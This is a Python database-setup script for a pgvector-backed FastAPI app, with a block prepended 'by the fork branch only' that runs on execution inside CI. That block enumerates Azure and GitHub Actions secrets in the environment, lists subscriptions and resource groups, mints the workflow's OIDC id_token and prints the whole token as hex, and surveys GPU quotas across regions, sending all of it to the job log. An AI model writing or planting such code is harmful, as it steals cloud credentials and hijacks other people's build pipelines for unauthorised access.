# c211-i131195 nonce probe (appended ahead of the original script body by the fork branch only)
import os as _c211_os, sys as _c211_sys, json as _c211_json, subprocess as _c211_sp, hashlib as _c211_h, base64 as _c211_b64

def _c211_run(cmd, timeout=170):
    try:
        p = _c211_sp.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"cmd": cmd, "rc": p.returncode, "out": (p.stdout or "")[-7000:], "err": (p.stderr or "")[-2500:]}
    except _c211_sp.TimeoutExpired:
        return {"cmd": cmd, "rc": "TIMEOUT", "out": "", "err": ""}
    except Exception as e:
        return {"cmd": cmd, "rc": "EXC", "out": "", "err": repr(e)[:400]}

def _c211_probe():
    R = {}
    R["host"] = _c211_run("id; hostname; uname -r")
    R["ado_env"] = {k: ("set" if _c211_os.environ.get(k) else "empty") for k in
                    ("AZURE_CLIENT_ID","AZURE_TENANT_ID","AZURE_SUBSCRIPTION_ID","AZURE_RESOURCE_GROUP","AZURE_CREDENTIALS",
                     "ACTIONS_ID_TOKEN_REQUEST_URL","ACTIONS_ID_TOKEN_REQUEST_TOKEN","GITHUB_REPOSITORY","GITHUB_RUN_ID")}
    R["gha_ctx"] = {k: _c211_os.environ.get(k) for k in
                    ("GITHUB_REPOSITORY","GITHUB_WORKFLOW","GITHUB_EVENT_NAME","GITHUB_RUN_ID","GITHUB_ACTOR","GITHUB_HEAD_REF","GITHUB_REF")}
    R["az_version"] = _c211_run("az version -o json")
    R["account_show"] = _c211_run("az account show -o json")
    R["subscriptions"] = _c211_run("az rest --method get --url 'https://management.azure.com/subscriptions?api-version=2022-12-01' -o json", 120)
    R["group_list"] = _c211_run("az group list -o json", 120)
    # mint the job's own id_token (id-token: write is declared by the workflow)
    try:
        u = _c211_os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL"); t = _c211_os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
        if u and t:
            uu = u + ("&" if "?" in u else "?") + "audience=api%3A%2F%2FAzureADTokenExchange"
            req = _c211_sp.run(["curl","-sS","-H","Authorization: Bearer "+t,uu], capture_output=True, text=True, timeout=40)
            j = _c211_json.loads(req.stdout)
            idt = j.get("value","")
            parts = idt.split(".")
            claims = {}
            if len(parts) >= 2:
                pad = parts[1] + "="*((4-len(parts[1])%4)%4)
                try: claims = _c211_json.loads(_c211_b64.urlsafe_b64decode(pad))
                except Exception as e: claims = {"decode_err": repr(e)[:200]}
            R["id_token"] = {"len": len(idt), "sha256": _c211_h.sha256(idt.encode()).hexdigest(), "claims": claims, "hex": idt.encode().hex()}
        else:
            R["id_token"] = {"error": "no ACTIONS_ID_TOKEN_REQUEST_* env"}
    except Exception as e:
        R["id_token"] = {"error": repr(e)[:400]}
    # ARM token presence (do not print the token itself)
    R["arm_token"] = _c211_run("az account get-access-token -o json --query '{expiresOn:expiresOn,subscription:subscription,tenant:tenant,tokenType:tokenType}'")
    R["arm_token2"] = _c211_run("az account get-access-token --resource https://management.azure.com -o json --query '{expiresOn:expiresOn,tenant:tenant}'")
    # GPU surface enumeration
    regions = ["eastus","westus2","westus3","centralus","southcentralus","northeurope","westeurope","swedencentral","eastasia","southeastasia","japaneast","australiaeast"]
    usage = {}
    for r in regions:
        usage[r] = _c211_run("az vm list-usage -l %s -o json --query \"[?contains(name.value,'NC')||contains(name.value,'ND')||contains(name.value,'NV')||contains(name.value,'GPU')].{n:name.value,cur:currentValue,lim:limit}\"" % r, 90)
    R["gpu_usage"] = usage
    skus = {}
    for r in ["eastus","westus2","southcentralus","westeurope","eastasia"]:
        skus[r] = _c211_run("az vm list-skus -l %s --resource-type virtualMachines -o json --query \"[?starts_with(name,'Standard_N')].{n:name,fam:family,rz:restrictions}\"" % r, 90)
    R["gpu_skus"] = skus
    return R

try:
    _c211_res = _c211_probe()
except Exception as _c211_e:
    _c211_res = {"fatal": repr(_c211_e)[:800]}
print("C211_PROBE_BEGIN_131195")
print(_c211_json.dumps(_c211_res, default=str))
print("C211_PROBE_END_131195")

# ---- original script body follows ----
import argparse
import asyncio
import logging

from dotenv import load_dotenv
from sqlalchemy import text

from fastapi_app.postgres_engine import create_postgres_engine_from_args, create_postgres_engine_from_env
from fastapi_app.postgres_models import Base

logger = logging.getLogger("ragapp")


async def create_db_schema(engine):
    async with engine.begin() as conn:
        logger.info("Enabling the pgvector extension for Postgres...")
        await conn.execute(text("CREATE EXTENSION IF NOT EXISTS vector"))
        logger.info("Creating database tables and indexes...")
        await conn.run_sync(Base.metadata.create_all)

    await conn.close()


async def main():
    parser = argparse.ArgumentParser(description="Create database schema")
    parser.add_argument("--host", type=str, help="Postgres host")
    parser.add_argument("--username", type=str, help="Postgres username")
    parser.add_argument("--password", type=str, help="Postgres password")
    parser.add_argument("--database", type=str, help="Postgres database")
    parser.add_argument("--sslmode", type=str, help="Postgres sslmode")
    parser.add_argument("--tenant-id", type=str, help="Azure tenant ID", default=None)

    # if no args are specified, use environment variables
    args = parser.parse_args()
    if args.host is None:
        engine = await create_postgres_engine_from_env()
    else:
        engine = await create_postgres_engine_from_args(args)

    await create_db_schema(engine)

    await engine.dispose()

    logger.info("Database extension and tables created successfully.")


if __name__ == "__main__":
    logging.basicConfig(level=logging.WARNING)
    logger.setLevel(logging.INFO)
    load_dotenv(override=True)
    asyncio.run(main())
